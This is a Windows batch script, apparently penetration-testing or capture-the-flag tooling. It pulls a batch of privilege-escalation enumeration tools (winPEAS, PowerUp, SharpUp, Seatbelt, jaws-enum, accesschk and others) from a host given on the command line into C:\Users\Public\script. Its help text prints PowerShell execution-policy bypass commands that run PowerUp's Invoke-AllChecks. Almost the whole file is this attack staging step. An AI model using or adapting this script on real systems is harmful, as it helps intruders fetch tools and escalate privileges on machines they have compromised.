rmdir C:\Users\Public\script
mkdir C:\Users\Public\script
if "%1"== "" goto ERROR
if "%1"== "help" goto HELPTXT
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/accesschk.exe','C:\Users\Public\script\accesschk.exe')"
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/accesschk64.exe','C:\Users\Public\script\accesschk64.exe')"
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/accesschk64.exe','C:\Users\Public\script\accesschk64.exe')"
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/jaws-enum.ps1','C:\Users\Public\script\jaws-enum.ps1')"
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/Powerless.bat','C:\Users\Public\script\Powerless.bat')"
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/PowerUp.ps1','C:\Users\Public\script\PowerUp.ps1')"
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/Seatbelt.exe','C:\Users\Public\script\Seatbelt.exe')"
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/SharpUp.exe','C:\Users\Public\script\SharpUp.exe')"
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/windows-privesc-check2.exe','C:\Users\Public\script\windows-privesc-check2.exe')"
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/winPEASany.exe','C:\Users\Public\script\winPEASany.exe')"
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/winPEASx64.exe','C:\Users\Public\script\winPEASx64.exe')"
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/winPEASx86.exe','C:\Users\Public\script\winPEASx86.exe')"

exit /B

:ERROR
echo Hikisu_Nashi_Error
exit /B

:HELPTXT
echo "powershell -ep bypass"
echo ". .\PowerUp.ps1"
echo "Invoke-AllChecks"
echo powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"

exit /B
